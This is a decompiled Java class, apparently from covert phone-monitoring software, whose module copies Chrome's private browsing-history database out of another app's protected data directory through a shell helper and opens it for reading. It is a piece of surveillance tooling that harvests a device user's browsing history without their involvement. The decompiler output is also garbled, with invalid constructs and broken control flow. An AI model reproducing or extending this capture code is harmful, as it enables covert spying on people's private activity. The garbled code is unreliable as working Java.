package com.vvt.capture.chrome.a;

import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.os.SystemClock;
import com.vvt.ak.a;
import com.vvt.io.p;
import com.vvt.shell.ShellUtil;
import java.io.File;

public class b
{
  private static final boolean a;
  private static final boolean b;
  
  static
  {
    boolean bool = a.a;
    if (bool) {}
    for (bool = true;; bool = false)
    {
      a = bool;
      b = a.e;
      return;
    }
  }
  
  private static SQLiteDatabase a(int paramInt, String paramString1, String paramString2)
  {
    boolean bool1 = false;
    Object localObject1 = null;
    Object localObject2;
    SQLiteDatabase localSQLiteDatabase;
    String str;
    int m;
    if (0 == 0)
    {
      int k = 2;
      localObject2 = new Object[k];
      localSQLiteDatabase = null;
      localObject2[0] = paramString1;
      int n = 1;
      localObject2[n] = paramString2;
      str = String.format("%s/%s", (Object[])localObject2);
      localObject2 = new java/io/File;
      ((File)localObject2).<init>(str);
      if (localObject2 != null)
      {
        m = ((File)localObject2).exists();
        if (m != 0) {}
      }
      else
      {
        return (SQLiteDatabase)localObject1;
      }
      bool1 = a;
      if (!bool1) {}
    }
    for (;;)
    {
      localObject2 = a(str, paramInt);
      int i = 5;
      localObject1 = localObject2;
      m = i;
      while ((localObject1 == null) && (m > 0))
      {
        boolean bool2 = a;
        if (bool2) {}
        long l = 1000L;
        SystemClock.sleep(l);
        localSQLiteDatabase = a(str, paramInt);
        int j = m + -1;
        m = j;
        localObject1 = localSQLiteDatabase;
      }
      break;
      str = null;
    }
  }
  
  private static SQLiteDatabase a(String paramString, int paramInt)
  {
    SQLiteDatabase localSQLiteDatabase = null;
    bool = false;
    try
    {
      localSQLiteDatabase = SQLiteDatabase.openDatabase(paramString, null, paramInt);
    }
    catch (SQLiteException localSQLiteException)
    {
      for (;;)
      {
        bool = b;
        if (!bool) {}
      }
    }
    return localSQLiteDatabase;
  }
  
  public static SQLiteDatabase a(String paramString1, String paramString2)
  {
    if (paramString1 == null)
    {
      boolean bool1 = b;
      if (bool1) {}
      bool1 = false;
    }
    String str;
    int i;
    for (Object localObject1 = null;; localObject1 = a(i, (String)localObject1, str))
    {
      return (SQLiteDatabase)localObject1;
      localObject1 = new java/lang/StringBuilder;
      ((StringBuilder)localObject1).<init>();
      localObject1 = ((StringBuilder)localObject1).append(paramString1);
      Object localObject2 = File.separator;
      localObject1 = (String)localObject2 + "chrome_database";
      localObject2 = new java/io/File;
      ((File)localObject2).<init>((String)localObject1);
      boolean bool2 = ((File)localObject2).exists();
      if (!bool2) {
        ((File)localObject2).mkdirs();
      }
      localObject2 = p.a("/data/data/com.android.chrome/app_chrome/Default", "History");
      str = p.a((String)localObject1, "History");
      ShellUtil.a((String)localObject2, str);
      ShellUtil.b(paramString2, str);
      i = 17;
      str = "History";
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/chrome/a/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */